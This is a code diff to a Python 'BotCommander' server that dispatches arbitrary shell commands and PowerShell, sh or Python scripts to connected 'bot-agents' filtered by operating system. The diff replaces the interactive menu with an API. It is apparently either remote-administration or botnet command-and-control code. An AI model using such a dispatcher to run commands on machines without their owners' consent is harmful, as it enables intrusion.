@@ -5,10 +5,10 @@ import asyncio
 import configparser
 from pathlib import Path
 from logger import Logger
+from api import CommanderApi
 from db import CommanderDatabase
 from socket import socket, AF_INET, SOCK_STREAM
-from helper import check_if_path_is_valid, json_serialize, json_deserialize, check_if_number, print_cmd_options,\
-    print_shell_note, print_help, print_script_help, get_user_input
+from helper import json_serialize, json_deserialize
 
 
 def load_conf():
@@ -42,161 +42,8 @@ class BotCommander:
         self.cmd_tout = cmd_tout
         self.offline_tout = offline_tout
         self.sock = socket(AF_INET, SOCK_STREAM)
+        self.api = CommanderApi(self.uuids, self.db)
         self.main()
-
-    def __print_timeout_note(self):
-        print(f"The current timeout value for the commands to run on agents equal to {self.cmd_tout} seconds, this"
-              f" can be changed in commander.ini or right now. If you change it now it will be updated with the"
-              f" value from commander.ini when commander is restarted.")
-
-    async def __timeout_choice(self):
-        msg = "Do you wish to change timeout value? [Y/N]: "
-        choice = await asyncio.get_running_loop().run_in_executor(None, get_user_input, msg)
-        match choice:
-            case "Y":
-                msg = "Please specify a new value for timeout of commands in seconds: "
-                value = await asyncio.get_running_loop().run_in_executor(None, get_user_input, msg)
-                try:
-                    val = int(value)
-                except ValueError:
-                    print("You have not inserted a digit, please insert a digit.")
-                    await self.__timeout_choice()
-                except Exception as err:
-                    print(
-                        f"An unexpected exception occurred while processing your choice. Please retry"
-                        f" This is the error: {err}")
-                self.cmd_tout = val
-            case "N":
-                pass
-            case _:
-                print("Please insert Y or N...")
-                await self.__timeout_choice()
-
-    async def __process_user_input(self):
-        while True:
-            print_help()
-            msg = "Please insert a digit corresponding to one of the available options: 1, 2 or 3: "
-            choice = await asyncio.get_running_loop().run_in_executor(None, get_user_input, msg)
-            val = check_if_number(choice)
-            if not val:
-                print("Please insert a number...")
-                await self.__process_user_input()
-            match val:
-                case 1:
-                    await self.__exec_shell_cmd()
-                case 2:
-                    await self.__exec_script()
-                case 3:
-                    asyncio.create_task(self.shutdown(signal.SIGTERM, asyncio.get_event_loop()))
-                    print("\nExiting Commander CLI...\nGoodbye!")
-                    break
-                case _:
-                    print("Please insert a digit corresponding to one of the available options: 1 or 2")
-
-    async def __exec_shell_cmd(self):
-        while True:
-            print_cmd_options()
-            msg = "Please insert a digit corresponding to one of the available options, 1, 2, 3, 4 or 5: "
-            choice = await asyncio.get_running_loop().run_in_executor(None, get_user_input, msg)
-            try:
-                val = int(choice)
-            except ValueError:
-                print("You have not inserted a digit, please insert a digit.")
-                continue
-            except Exception as err:
-                print(f"An unexpected exception occurred while processing your choice. Please retry and insert a digit."
-                      f" This is the error: {err}")
-                continue
-            match val:
-                case 1:
-                    cmd_filter = "Windows"
-                case 2:
-                    cmd_filter = "Linux"
-                case 3:
-                    cmd_filter = "Darwin"
-                case 4:
-                    cmd_filter = ""
-                case 5:
-                    break
-                case _:
-                    print("Please insert a digit corresponding to one of the available options, 1, 2, 3 or 4")
-                    print_cmd_options()
-                    continue
-            print_shell_note()
-            self.__print_timeout_note()
-            await self.__timeout_choice()
-            while True:
-                msg = "Please insert the command you want to send to bot-agents: "
-                cmd = await asyncio.get_running_loop().run_in_executor(None, get_user_input, msg)
-                if cmd:
-                    await self.__schedule_command("exeCommand", cmd_filter, cmd)
-                    print(f"Command {cmd} was successfully sent to {len(self.success_list)} agents"
-                          f" and failed to send for {len(self.target_list) - len(self.success_list)} agents")
-                    msg = "Do you wish to run another command using the same filter? Y/N: "
-                    choice = await asyncio.get_running_loop().run_in_executor(None, get_user_input, msg)
-                    match choice:
-                        case "Y":
-                            continue
-                        case "N":
-                            break
-                        case _:
-                            print("The only supported inputs are Y and N, please make sure you use one of them ...")
-                            break
-                else:
-                    print("You need to insert something. Starting over")
-                    print_cmd_options()
-                    continue
-
-    async def __exec_script(self):
-        while True:
-            print_script_help()
-            msg = "Please insert a digit corresponding to one of the available options, 1, 2, 3 or 4: "
-            choice = await asyncio.get_running_loop().run_in_executor(None, get_user_input, msg)
-            val = check_if_number(choice)
-            if not val:
-                print("Please insert a number...")
-                continue
-            match val:
-                case 1:
-                    script_type = "powershell"
-                    cmd_filter = "Windows"
-                case 2:
-                    script_type = "sh"
-                    cmd_filter = "Linux"
-                case 3:
-                    script_type = "python"
-                    cmd_filter = ""
-                case 4:
-                    break
-                case _:
-                    print("Please insert 1, 2, 3 or 4, nothing else")
-                    continue
-            await self.__schedule_script(script_type, cmd_filter)
-
-    async def __schedule_script(self, script_type, cmd_filter):
-        self.__print_timeout_note()
-        await self.__timeout_choice()
-        while True:
-            msg = f"NOTE: Commander will not check if the file specified by you is a valid {script_type} script.\n"\
-                  f"Please insert absolute path for the {script_type} script which you want to send to bot-agents: "
-            path_to_script = await asyncio.get_running_loop().run_in_executor(None, get_user_input, msg)
-            if not check_if_path_is_valid(path_to_script):
-                print("Inserted path is not a valid file path")
-                continue
-            with open(path_to_script, 'r') as fh:
-                data = fh.read()
-            await self.__schedule_command("exeScript", cmd_filter, data, script_type, path_to_script)
-            print(f"Script {path_to_script} was successfully sent to {len(self.success_list)} agents and"
-                  f" failed to send for {len(self.target_list) - len(self.success_list)} agents")
-            msg = "Do you wish to send another script using the same options? [Y/N] "
-            choice = await asyncio.get_running_loop().run_in_executor(None, get_user_input, msg)
-            match choice:
-                case "Y":
-                    continue
-                case "N":
-                    break
-                case _:
-                    "Please choose from Y and N next time..."
 
     def _get_target_list(self, cmd_filter):
         active_agents = [uid for uid in self.uuids if self.uuids[uid].get("writer")]
@@ -430,8 +277,8 @@ class BotCommander:
             loop.add_signal_handler(
                 s, lambda s=s: asyncio.create_task(self.shutdown(s, loop)))
         try:
-            loop.create_task(self.__process_user_input())
             self.db.check_pending_task = loop.create_task(self.db.check_if_pending())
+            loop.create_task(self.api.start_api())
             loop.create_task(self.__server_run())
             loop.run_forever()
         finally:
